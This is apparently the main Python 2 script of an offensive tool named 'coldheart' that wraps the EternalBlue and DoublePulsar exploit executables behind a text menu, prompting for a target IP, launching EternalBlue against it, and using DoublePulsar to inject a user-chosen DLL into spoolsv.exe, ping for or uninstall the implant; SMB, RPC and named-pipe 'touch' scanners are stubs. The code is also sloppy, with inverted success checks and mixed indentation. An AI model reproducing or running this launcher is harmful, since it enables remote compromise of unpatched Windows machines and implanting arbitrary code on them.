### Imports
import os
import sys
import platform
import subprocess
from random import *
from time import sleep
from imports.paths import *
from imports.styles import *
from imports.banners import *
from datetime import datetime
###

### Path setup
COLDHEART, CHDIR = setup_paths(os.path.realpath(__file__))
EXPLOIT_DIR = os.path.join(CHDIR, 'exploits')
TOUCH_DIR = os.path.join(CHDIR, 'touches')
DP_OUTPUT = os.path.join(CHDIR, 'DP_output')
###

### Main code
def main():
    validate()
    # Initiate colorama
    init()
    # colors
    def red(s):
	       print(Style.BRIGHT + Fore.RED + s + Style.RESET_ALL)
    def blue(s):
    	print(Style.BRIGHT + Fore.BLUE + s + Style.RESET_ALL)
    def green(s):
    	print(Style.BRIGHT + Fore.GREEN + s + Style.RESET_ALL)
    def yellow(s):
    	print(Style.BRIGHT + Fore.YELLOW + s + Style.RESET_ALL)

    # set up GUI stuff
    banners = [banner1, banner2, banner3]
    colors = [red, blue, green, yellow]
    subprocess.call('cls', shell = True)
    choice(colors)(choice(banners))
    menus.info()
    menus.start()

    # exploit, or touch menu option prompt
    start_menu_answered = False
    while not start_menu_answered:
        try:
            option = int(raw_input(styles.question + 'Option > '))
            #
            #
            if option == 1:
                # Exploits
                exploit_selected = False
                while not exploit_selected:
                    try:
                        menus.exploits()
                        option = int(raw_input(styles.question + '(EXPLOITS) > '))
                        if option == 1:
                            # Eternalblue
                            status = launch_eternalblue()
                            # == True only to make it clear
                            if status == False:
                                prints.good('Eternalblue success!')
                                sleep(3)
                            else:
                                prints.bad('Eternalblue failed.')
                                sleep(3)
                        elif option == 2:
                            # Doublepulsar
                            status = launch_doublepulsar()
                            exploit_selected = True
                            if status == False:
                            	prints.good('Doublepulsar success!')
                            	sleep(3)
                            	#exploit_selected = True
                            elif status == 'back':
                            	#exploit_selected = True
                            	#prints.info('Back Selected')
                            	break
                            else:
                            	prints.bad('Doublepulsar failed.')
                            	#exploit_selected = True
                        elif option == 3:
                            # Exit
                            prints.info('Now exiting...')
                            sleep(2)
                            sys.exit(0)
                        else:
                            prints.bad('Not an option')
                    except ValueError:
                        prints.bad('Not an option')
            #
            #
            elif option == 2:
                # Touches
                menus.touches()
                start_menu_answered = True
                touch_selected = False
                while not touch_selected:
                    try:
                        option = int(raw_input(styles.question + '(TOUCHES) > '))
                        if option == 1:
                            # named pipe touch
                            launch_NPT()
                            touch_selected = True
                        elif option == 2:
                            # rpc touch
                            launch_RPCT()
                            touch_selected = True
                        elif option == 3:
                            # smb touch
                            launch_SMBT()
                            touch_selected = True
                        elif option == 4:
                            # exit
                            prints.info('Now exiting...')
                            sleep(2)
                            sys.exit(0)
                        else:
                            prints.bad('Not an option')
                    except ValueError:
                        prints.bad('Not an option')
            #
            #
            elif option == 3:
                # Exit
                prints.info('Now exiting...')
                sleep(2)
                sys.exit(0)
            #
            #
            else:
                prints.bad('Not an option')
        except ValueError:
            prints.bad('Not an option')
    prints.info('Break')
    sleep(3)

def validate():
    # Check if the os is windows
    print '[*] Checking os...'
    
    if os.name != 'nt':
        print '[!] This is the windows version, get the linux version.\n[!] Your OS:', os.name
        sys.exit(0)
    else:
        print '[+] Valid OS:', os.name

    print '[*] Checking os version...'

    win_version = platform.platform()

    if win_version.lower().__contains__('xp') or win_version.lower().__contains__('vista'):
        print '[!] Windows 7 is the oldest compatible windows version!\n[!] Your version:', win_version
        sys.exit(0)
    else:
        print '[+] Valid Windows version:', win_version

    print '[*] Checking python version...'

    python_version = float(platform.python_version()[:3])

    if python_version > 2.7 or python_version < 2.7:
        print '[!] Python 2.7 should be used to run coldheart.\n[!] Your version:', python_version
        sys.exit(0)
    else:
        print '[+] Valid python version:', python_version

    sleep(3)

def launch_eternalblue():
    ip = raw_input(styles.question + 'Target IP > ')
    prints.info('Starting Eternalblue now... Time: %s' % (str(datetime.now().time())[:8]))
    # Implement new output filter algorithm here
    failed = False
    try:
        proc = subprocess.check_output('powershell.exe %s\\eternalblue\\Eternalblue-2.2.0.exe --inconfig %s\\eternalblue\\Eternalblue-2.2.0.0.xml --targetip %s' % (EXPLOIT_DIR, EXPLOIT_DIR, ip),shell = True)
        output = proc.split('\n')
        for line in output:
            # Get rid of XML data
            if '<' in line:
                pass
            else:
                print(line)
    except subprocess.CalledProcessError:
        failed = True
    return failed

def launch_doublepulsar():
    ip = raw_input(styles.question + 'Target IP > ')
    prints.info('Starting Doublepulsar now...')
    # Implement new output filter algorithm here
    dp_function = True
    while dp_function:
	    prints.info('Functions:')
	    prints.info('rundll')
	    prints.info('ping')
	    prints.info('uninstall')
	    prints.info('back')
	    function = raw_input(styles.question + '(EXPLOITS) Function > ')
	    if function == 'rundll':
	    	try:
			dll = raw_input(styles.question + '(EXPLOITS) Path to dll > ')
			proc = subprocess.check_output('powershell.exe %s\\doublepulsar\\Doublepulsar-1.3.1.exe --inconfig %s\\doublepulsar\\Doublepulsar-1.3.1.0.xml --targetip %s --function %s --dllpayload %s --processname spoolsv.exe' % (EXPLOIT_DIR, EXPLOIT_DIR, ip, function, dll),shell = True)
		    	prints.good('Doublepulsar Complete.')
		    	failed = False
			try:
				output = proc.split('\n')
				for line in output:
				# Get rid of XML data
					if '<' in line:
						pass
					else:
						print(line)
						sleep(5)
			except subprocess.CalledProcessError:
				prints.bad('Failed')
				sleep(5)
				failed = True
		except:
			prints.bad('Doublepulsar failed! It\'s likely doublepulsar has not been installed, run eternalblue to fix.')
	    elif function == 'ping':
	    	try:
			proc = subprocess.check_output('powershell.exe %s\\doublepulsar\\Doublepulsar-1.3.1.exe --inconfig %s\\doublepulsar\\Doublepulsar-1.3.1.0.xml --targetip %s --function %s --processname spoolsv.exe' % (EXPLOIT_DIR, EXPLOIT_DIR, ip, function),shell = True)
			prints.good('Doublepulsar Complete.')
			failed = False
			try:
				output = proc.split('\n')
				for line in output:
				# Get rid of XML data
					if '<' in line:
						pass
					else:
						print(line)
						sleep(5)
			except subprocess.CalledProcessError:
				prints.bad('Failed')
				sleep(5)
				failed = True
		except:
			prints.bad('Doublepulsar failed! It\'s likely doublepulsar has not been installed, run eternalblue to fix.')
	    elif function == 'uninstall':
	    	try:
		    	proc = subprocess.check_output('powershell.exe %s\\doublepulsar\\Doublepulsar-1.3.1.exe --inconfig %s\\doublepulsar\\Doublepulsar-1.3.1.0.xml --targetip %s --function %s --processname spoolsv.exe' % (EXPLOIT_DIR, EXPLOIT_DIR, ip, function),shell = True)
			prints.good('Doublepulsar Complete.')
			failed = False
			try:
				output = proc.split('\n')
				for line in output:
				# Get rid of XML data
					if '<' in line:
						pass
					else:
						print(line)
						sleep(5)
			except subprocess.CalledProcessError:
				prints.bad('Failed')
				sleep(5)
				failed = True
		except:
			prints.bad('Doublepulsar failed! It\'s likely doublepulsar has not been installed, run eternalblue to fix.')
	    elif function == 'back':
	    	prints.info('Returning to main menu...')
	    	sleep(2)
	    	dp_function = False
	    	return 'back'
	    else:
	    	prints.bad('Invalid function!')
    return failed


def launch_NPT():
    ip = raw_input(styles.question + 'Target IP > ')
    prints.info('Starting Named Pipe Touch now...')
    # Implement new output filter algorithm here

def launch_RPCT():
    ip = raw_input(styles.question + 'Target IP > ')
    prints.info('Starting RPC Touch now...')
    # Implement new output filter algorithm here

def launch_SMBT():
    ip = raw_input(styles.question + 'Target IP > ')
    prints.info('Starting SMB Touch now...')
    # Implement new output filter algorithm here


if __name__ == '__main__':
    main()
